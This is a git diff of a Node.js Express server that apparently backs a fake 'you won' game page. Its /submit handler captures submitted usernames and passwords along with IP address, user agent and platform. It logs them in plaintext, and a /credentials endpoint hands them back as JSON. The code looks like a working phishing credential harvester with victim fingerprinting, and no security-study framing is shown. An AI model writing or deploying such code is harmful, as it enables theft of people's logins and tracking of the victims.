@@ -145,42 +145,34 @@ app.post('/revealWon',(req, res) => {
     
 });
 
-/*
-let creds = []
-app.post('/submit', (req, res) => {
-    const username = req.body.username || "";
-    const password = req.body.password || "";
 
-    //console.log("Username input:", username);
-    //console.log("Password input:", password);
-
-    // req.session.username = username;
-    // req.session.password = password;
-
-    creds[0] = username;
-    creds[1] = password;
-
-    console.log(creds[0])
-    console.log(creds[1])
-
-    //res.sendFile(path.join(__dirname, "files", "gameSites", "revealWon.html"));
-    res.status(200).set("Content-Type", "text/plain").send("OK");
-});
-
-*/
 
 
 
 app.post('/submit', (req, res) => {
     const username1 = req.body.username || "";
     const password1 = req.body.password || "";
+    const userAgent1 = req.body.userAgent || "";
+    const platform1 = req.body.platform || "";
 
-    // Store username and password in session
+    let ip1 = req.body.ip || "";
+
+    if (!ip1) {
+        ip1 = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "Unknown IP";
+    }
+
     req.session.username = username1;
     req.session.password = password1;
+    req.session.ip = ip1;
+    req.session.userAgent = userAgent1;
+    req.session.platform = platform1;
 
-    console.log(username1)
-    console.log(password1)
+    console.log(`Username: ${username1}`);
+    console.log(`Password: ${password1}`);
+    console.log(`IP: ${ip1}`);
+    console.log(`User-Agent: ${userAgent1}`);
+    console.log(`Platform: ${platform1}`);
+
 
     // Save the session explicitly
     req.session.save(err => {
@@ -199,7 +191,10 @@ app.get('/credentials', (req, res) => {
     console.log("Fetching from session:", req.session.username, req.session.password);
     res.json({
         username: req.session.username || "N/A",
-        password: req.session.password || "N/A"
+        password: req.session.password || "N/A",
+        ip: req.session.ip || "N/A",
+        userAgent: req.session.userAgent || "N/A",
+        platform: req.session.platform || "N/A"
     });
 });
 
